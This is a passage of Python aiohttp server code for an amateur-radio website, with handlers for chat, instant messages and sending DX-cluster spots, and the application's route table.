    with open( logPath, 'w' ) as f:
        json.dump( log, f )
    return web.Response( text = 'OK' )

def replace0( val ):
    return val.replace( "0", u"\u00D8" )

@asyncio.coroutine
def chatHandler(request):
    data = yield from request.json()
    admin = False
    callsign = decodeToken( data )
    chatPath = ''
    station = data['station'] if 'station' in data else None
    chat = []
    if station:
        stationPath = getStationPath( data['station'] )
        stationSettings = loadJSON( stationPath + '/settings.json' )
        admins = [x.lower() for x in\
            stationSettings['chatAdmins'] + [ stationSettings['admin'], ]]
        admin = 'from' in data and data['from'].lower() in admins
        chatPath = stationPath + '/chat.json'
    else:
        chatPath = webRoot + '/js/talks.json'
        admin = isinstance( callsign, str ) and callsign in siteAdmins
    if ('clear' in data or 'delete' in data or 
            ('text' in data and data['text'][0] == '@')):
        callsign = decodeToken( data )
        if not isinstance( callsign, str ):
            return callsign
        if 'clear' in data or 'delete' in data:
            admins = siteAdmins + [stationSettings['admin'],] if station else siteAdmins
            if not callsign in admins:
                return web.HTTPUnauthorized( \
                    text = 'You must be logged in as station or site admin' )
        else:
            if not callsign in imUsers:
                return web.HTTPUnauthorized( \
                    text = 'You must be logged in as im user' )
    if not 'clear' in data and not 'delete' in data:
        insertChatMessage(path=chatPath, msg_data=data, admin=admin)
    else:
        if 'delete' in data:
            chat = loadJSON( chatPath )
            if not chat:
                chat = []
            chat = [ x for x in chat if x['ts'] != data['delete'] ]
        with open( chatPath, 'w' ) as f:
            json.dump( chat, f, ensure_ascii = False )
    return web.Response( text = 'OK' )

@asyncio.coroutine
def checkInstantMessageHandler(request):
    data = yield from request.json()
    rsp = None
    if data['user'] in IM_QUEUE:
        rsp = IM_QUEUE[data['user']]
        del IM_QUEUE[data['user']]
        logging.debug('------- IM_QUEUE -------')
        logging.debug(IM_QUEUE)
    return web.json_response(rsp)

def insertChatMessage(path, msg_data, admin):
    CHAT_MAX_LENGTH = int(conf['chat']['max_length'])
    chat = loadJSON(path)
    if not chat:
        chat = []
    msg = { 'user': msg_data['from'], \
            'text': msg_data['text'], \
            'admin': admin, 'ts': time.time() }
    msg['date'], msg['time'] = dtFmt( datetime.utcnow() )
    if msg['text'][0] == '@':
        to, txt = msg['text'][1:].split(' ', maxsplit=1)
        txt = txt.strip()
        if not txt and to in IM_QUEUE:
            del IM_QUEUE[to]
        else:
            IM_QUEUE[to] = {
                    'user': msg['user'],
                    'text': txt,
                    'ts': msg['ts'],
                    'date': msg['date'],
                    'time': msg['time']
                    }
            logging.debug('------- IM_QUEUE -------')
            logging.debug(IM_QUEUE)
    else:
        if 'name' in msg_data:
            msg['name'] = msg_data['name']
        chat.insert(0, msg)
        chat_trunc = []
        chat_adm = []
        for msg in chat:
            if msg['text'].startswith('***') and msg['admin']:
                chat_adm.append(msg)
            elif len(chat_trunc) < CHAT_MAX_LENGTH:
                chat_trunc.append(msg)
        chat = chat_adm + chat_trunc
        with open(path, 'w') as f:
            json.dump(chat, f, ensure_ascii = False)

@asyncio.coroutine
def sendSpotHandler(request):
    global lastSpotSent
    data = yield from request.json()
    now = datetime.now().timestamp()
    response = { 'sent': False, 
            'secondsLeft': conf.getint( 'cluster', 'spotInterval' ) }
    if not lastSpotSent or now - lastSpotSent > response['secondsLeft']:
        lastSpotSent = now
        protocol = yield from  clusterProtocol.connect( app.loop, \
            call = data['userCS'], 
            host = conf.get( 'cluster', 'host' ),
            port = conf.get( 'cluster', 'port' ) )

        def sendSpot():
            protocol.write( 'dx ' + data['cs'] + ' ' + data['freq'] + ' ' + \
                data['info'] )
            response['sent'] = True
            app.loop.call_later( 1, protocol.close )

        if protocol:
            logging.debug( 'Protocol connected' )
            protocol.onLoggedIn.append( sendSpot )
            yield from protocol.waitDisconnected()
            if not response['sent']:
                response['reply'] = protocol.latestReply
    else:
        response['secondsLeft'] -= now - lastSpotSent
    return web.json_response( response )
 
 
if __name__ == '__main__':
    app = web.Application( client_max_size = 200 * 1024 ** 2 )
    app.router.add_post('/aiohttp/login', loginHandler)
    app.router.add_post('/aiohttp/userSettings', userSettingsHandler)
    app.router.add_post('/aiohttp/news', newsHandler)
    app.router.add_post('/aiohttp/track', trackHandler)
    app.router.add_post('/aiohttp/chat', chatHandler)
    app.router.add_post('/aiohttp/activeUsers', activeUsersHandler)
    app.router.add_post('/aiohttp/log', logHandler)
    app.router.add_post('/aiohttp/location', locationHandler)
    app.router.add_post('/aiohttp/publish', publishHandler)
    app.router.add_post('/aiohttp/passwordRecoveryRequest', \
            passwordRecoveryRequestHandler )
    app.router.add_post('/aiohttp/contact', contactHandler )
    app.router.add_post('/aiohttp/userData', userDataHandler )
    app.router.add_post('/aiohttp/gallery', galleryHandler )
    app.router.add_post('/aiohttp/sendSpot', sendSpotHandler )
    app.router.add_post('/aiohttp/instantMessage', checkInstantMessageHandler )
    app.router.add_get('/aiohttp/adif/{callsign}', exportAdifHandler)

    db.verbose = True
    asyncio.async( db.connect() )

    args = parser.parse_args()
    web.run_app(app, path = conf.get( 'sockets', 'srv_test' if args.test else 'srv' ) )
